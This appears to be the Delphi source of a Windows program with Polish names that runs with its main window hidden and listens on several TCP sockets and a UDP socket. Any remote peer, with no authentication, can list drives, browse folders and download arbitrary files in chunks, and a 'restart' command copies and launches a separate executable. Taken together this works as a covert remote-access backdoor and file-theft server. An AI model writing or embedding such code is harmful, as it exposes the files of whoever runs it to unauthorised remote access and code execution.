unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ScktComp, StdCtrls,IdBaseComponent, IdComponent,
  IdUDPBase, IdUDPServer, ExtCtrls, FileCtrl, ComCtrls,strutils,idsockethandle;

type
  TForm1 = class(TForm)
    cpower: TClientSocket;
    spower: TServerSocket;
    ldysk: TDriveComboBox;
    katalog: TDirectoryListBox;
    pliklist: TFileListBox;
    pob: TServerSocket;
    wplik: TClientSocket;
    roz: TClientSocket;
    krozmiar: TClientSocket;
    srozmiar: TServerSocket;
    skat: TServerSocket;
    kats: TClientSocket;
    plik: TClientSocket;
    Timer1: TTimer;
    res: TServerSocket;
    sudp: TIdUDPServer;
    ip: TClientSocket;
    procedure cpowerConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure spowerClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure pobClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure FormCreate(Sender: TObject);
    procedure srozmiarClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure skatClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Timer1Timer(Sender: TObject);
    procedure resClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure sudpUDPRead(Sender: TObject; AData: TStream;
      ABinding: TIdSocketHandle);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  potwierdz,pobierzdysk:boolean;
  zadanie:integer;
  dir:string;
  pozycja:integer;
  plsciez:tcaption;
implementation

{$R *.dfm}

procedure TForm1.cpowerConnect(Sender: TObject; Socket: TCustomWinSocket);
var
dysk :string;
listadysk:tcaption;
i:integer;
begin
try
if potwierdz=true
then
begin
cpower.Socket.SendText('Sprawdzaj');
potwierdz:=false;
end;
if pobierzdysk=true then
begin
pobierzdysk:=false;
for i:=0 to ldysk.Items.Count-1 do
  begin
  dysk:=ldysk.Items.Strings[i];
  delete(dysk,2,length(dysk));
  dysk:=dysk+':\';
  listadysk:=listadysk+dysk;
  end;
cpower.Socket.SendText('listadysk'+inttostr(ldysk.Items.Count)+listadysk);
end;
except
wplik.Active:=false;
roz.Active:=false;
cpower.Active:=false;
krozmiar.Active:=false;
end;
end;

procedure TForm1.spowerClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
tekst:string;
begin
try
tekst:=socket.ReceiveText;
spower.FreeOnRelease;
if cpower.Active then cpower.Active:=false;
if tekst='koniec' then
begin
close;
end;
if tekst='Sprawdzaj'then
begin
potwierdz:=true;
cpower.Host:=socket.RemoteAddress;
cpower.Active:=true;
end;
if tekst='pobierzdysk' then
begin
pobierzdysk:=true;
cpower.Host:=socket.RemoteAddress;
cpower.Active:=true;
end;
if tekst[1]='6' then
begin
zadanie:=4;
tekst:=copy(tekst,2,length(tekst));
cpower.Host:=socket.RemoteAddress;
cpower.Active:=true;
end;
except
wplik.Active:=false;
roz.Active:=false;
cpower.Active:=false;
krozmiar.Active:=false;
cpower.Host:='';
zadanie:=0;
pobierzdysk:=false;
potwierdz:=false;
spower.FreeOnRelease;
end;
spower.FreeOnRelease;
end;

procedure TForm1.pobClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
t:string;
i:integer;
s:tfilestream;
buf:array of byte;
begin
t:=socket.ReceiveText;
if t='przerwa'then
  begin
  wplik.Active:=false;
  wplik.Host:='';
  end;
if t[1]='1' then
  begin
  delete(t,1,1);
  if fileexists(t)then
    begin
    try
    wplik.Host:=socket.RemoteAddress;
    wplik.Active:=true;
    s:=tfilestream.Create(t,fmopenread+fmsharedenywrite);
    i:=s.Size;
    s.Free;
    roz.Host:=socket.RemoteAddress;
    roz.Active:=true;
    roz.Socket.SendText(inttostr(i));
    roz.Active:=false;
    roz.Host:='';
    except
    pob.FreeOnRelease;
    wplik.Active:=false;
    roz.Active:=false;
    cpower.Active:=false;
    krozmiar.Active:=false;
    roz.Host:='';
    end;
    end;
  end;
if t[1]='2' then
  begin
  delete(t,1,1);
  i:=pos('|',t);
  plsciez:=copy(t,1,i-1);
  pozycja:=strtoint(copy(t,i+1,length(t)));
  if fileexists(plsciez)then
    begin
    s:=tfilestream.Create(plsciez,fmopenread+fmsharedenywrite);
    s.Seek(pozycja,sofrombeginning);
    if s.Size-pozycja<70000 then
      begin
      setlength(buf,s.size-pozycja);
      s.read(buf[0],s.size-pozycja);
      end
    else
      begin
      setlength(buf,70000);
      s.Read(buf[0],70000);
      end;
    s.Free;
    end;
  try
  pob.FreeOnRelease;
  wplik.Socket.SendBuf(buf[0],length(buf));
  except
  pob.FreeOnRelease;
  wplik.Active:=false;
  roz.Active:=false;
  cpower.Active:=false;
  krozmiar.Active:=false;
  wplik.Host:='';
  end;
  end;
end;
procedure TForm1.FormCreate(Sender: TObject);
begin
try
application.ShowMainForm:=false;
if FileExists('res.exe')then deletefile('res.exe');
spower.Active:=true;
pob.Active:=true;
srozmiar.Active:=true;
skat.Active:=true;
res.Active:=true;
sudp.Active:=true;
except
end;
end;

procedure TForm1.srozmiarClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
t:string;
s:tfilestream;
begin
t:=socket.ReceiveText;
try
if fileexists(t)then
  begin
  s:=tfilestream.Create(t,fmopenread+fmsharedenywrite);
  t:=inttostr(s.Size);
  s.Free;
  krozmiar.Host:=socket.RemoteAddress;
  krozmiar.Active:=true;
  krozmiar.Socket.SendText(t);
  krozmiar.Active:=false;
  srozmiar.FreeOnRelease;
  end;
except
srozmiar.FreeOnRelease;
wplik.Active:=false;
roz.Active:=false;
cpower.Active:=false;
krozmiar.Active:=false;
end;
end;

procedure TForm1.skatClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
tekst,tekst1:tcaption;
i:integer;
ps:integer;
begin
tekst:=socket.ReceiveText;
if tekst[1]='4' then
begin
i:=pos('|',tekst);
ps:=strtoint(copy(tekst,2,i-2));
tekst:=copy(tekst,i+1,length(tekst));
if ps=0 then katalog.Directory:=tekst;
if ps=0 then tekst:='1'+inttostr(length(pliklist.Items.Text))+'|' else tekst:='2';
if length(pliklist.Items.Text)-ps<4000 then
tekst:=tekst+copy(pliklist.Items.Text,ps+1,length(pliklist.Items.Text)) else
tekst:=tekst+copy(pliklist.Items.Text,ps+1,4000);
try
if plik.Active then plik.Active:=false;
plik.Address:=socket.RemoteAddress;
plik.Active:=true;
plik.Socket.SendText(tekst);
except
plik.Active:=false;
kats.Active:=false;
exit;
end;
end;
if tekst[1]='5' then
  begin
  i:=pos('|',tekst);
  ps:=strtoint(copy(tekst,2,i-2));
  for i:=length(katalog.Directory) downto 1 do tekst1:=tekst1+katalog.Directory[i];
  i:= pos('\',tekst1);
  tekst:=copy(tekst1,1,i-1);
  tekst1:='';
  for i:=length(tekst)downto 1 do tekst1:=tekst1+tekst[i];
  i:=pos(tekst1,katalog.items.Text);
  if i<>0 then tekst:=copy(katalog.items.Text,i+length(tekst1)+2,length(katalog.items.Text)) else tekst:=copy(katalog.items.Text,i+length(tekst1)+6,length(katalog.items.Text)) ;
  if ps=0 then tekst1:='1'+inttostr(length(tekst))+'|' else tekst1:='2';
  if length(tekst)-ps<4000 then
  tekst1:=tekst1+copy(tekst,ps+1,length(tekst)) else
  tekst1:=tekst1+copy(tekst,ps+1,4000);
  try
  if kats.Active then kats.Active:=false;
  kats.Address:=socket.RemoteAddress;
  kats.Active:=true;
  kats.Socket.SendText(tekst1);
  kats.Active:=false;
  except
  plik.Active:=false;
  kats.Active:=false;
  exit;
  end;
  end;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
deletefile('res.exe');
timer1.Enabled:=false;
end;

procedure TForm1.resClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
tekst:string;
begin
try
tekst:=socket.ReceiveText;
spower.FreeOnRelease;
if tekst='restart'then
  begin
  copyfile('res.rst','res.exe',true);
  winexec('res.exe',sw_shownormal);
  close;
  exit;
  end;
except

end;
end;

procedure TForm1.sudpUDPRead(Sender: TObject; AData: TStream;
  ABinding: TIdSocketHandle);
  var
  s:string[255];
  begin
adata.read(s[1],adata.Size);
s:=copy(s,1,2);
if s='IP'then
  begin
  ip.Host:=abinding.PeerIP;
  try
  ip.Active:=true;
  ip.Socket.SendText('IP');
  ip.Active:=false;
  except
  end;
  end;
end;

end.
